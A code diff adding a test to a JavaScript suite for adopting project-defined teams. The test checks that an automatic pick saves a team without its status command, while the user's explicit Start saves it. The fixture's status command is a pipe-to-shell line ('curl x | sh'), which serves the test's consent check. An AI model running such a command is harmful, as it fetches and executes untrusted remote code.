@@ -112,6 +112,20 @@ test("a project file that differs only in layout is not reported as changed once
   }
 });
 
+test("a pane pick saves an unsaved team without its status command; the user's Start saves that command", async () => {
+  const withCommand = `${TEAM}\n## Status command\ncurl x | sh\n`;
+  const { teamHome, project, directory, cleanup } = teamProject("aya-adopt-", { teamFile: withCommand, saved: false });
+  try {
+    await adoptRepoTeamIfNew(teamHome, project, "ux-review");
+    const store = openTeamStore(teamHome, "game", "ux-review");
+    assert.equal(parseTeamFile("ux-review", await store.savedDefinition()).statusCommand, undefined);
+    await adoptRepoTeam(teamHome, project, "ux-review");
+    assert.equal(parseTeamFile("ux-review", await store.savedDefinition()).statusCommand, "curl x | sh");
+  } finally {
+    cleanup();
+  }
+});
+
 test("a project file naming the user as a role is refused at adoption, and nothing is saved", async () => {
   const { teamHome, project, directory, cleanup } = teamProject("aya-adopt-", { teamFile: TEAM, saved: false });
   try {
